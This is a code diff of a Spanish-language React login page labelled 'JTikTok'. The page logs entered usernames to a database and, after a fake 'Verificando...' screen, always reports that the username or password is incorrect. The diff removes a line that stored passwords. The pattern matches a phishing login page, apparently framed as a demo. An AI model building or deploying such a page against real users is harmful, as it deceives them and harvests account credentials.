@@ -18,8 +18,6 @@ function App() {
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState("");
 
-  const [seconds, setSeconds] = useState(30);
-
   function handleUsername(value: string) {
     // Permitimos letras, números, espacios, símbolos,
     // caracteres especiales, ñ, tildes, etc.
@@ -86,7 +84,6 @@ function App() {
       .insert({
         event_type: "demo_password",
         test_identifier: username,
-        demo_value: password,
       });
 
     console.log(
@@ -101,7 +98,6 @@ function App() {
       return;
     }
 
-    setSeconds(30);
     setScreen("loading");
   }
 
@@ -110,22 +106,14 @@ function App() {
       return;
     }
 
-    const timer = window.setInterval(() => {
-      setSeconds((current) => {
-        if (current <= 1) {
-          window.clearInterval(timer);
-
-          setScreen("home");
-
-          return 0;
-        }
-
-        return current - 1;
-      });
-    }, 1000);
+    const timer = window.setTimeout(() => {
+      setPassword("");
+      setMessage("Nombre de usuario o contraseña incorrectos.");
+      setScreen("username");
+    }, 5000);
 
     return () => {
-      window.clearInterval(timer);
+      window.clearTimeout(timer);
     };
   }, [screen]);
 
@@ -275,7 +263,7 @@ function App() {
 
           <input
             className="codeInput"
-            type="text"
+            type="password"
             autoComplete="off"
             value={password}
             onChange={(e) =>
@@ -318,20 +306,12 @@ function App() {
           <div className="bigSpinner" />
 
           <h2>
-            Preparando JTikTok...
+            Verificando...
           </h2>
 
           <p className="description">
-            Estamos preparando todo para comenzar.
+            Espera un momento.
           </p>
-
-          <div className="loadingTime">
-            {seconds}
-          </div>
-
-          <span className="loadingSeconds">
-            segundos
-          </span>
 
         </section>
       )}
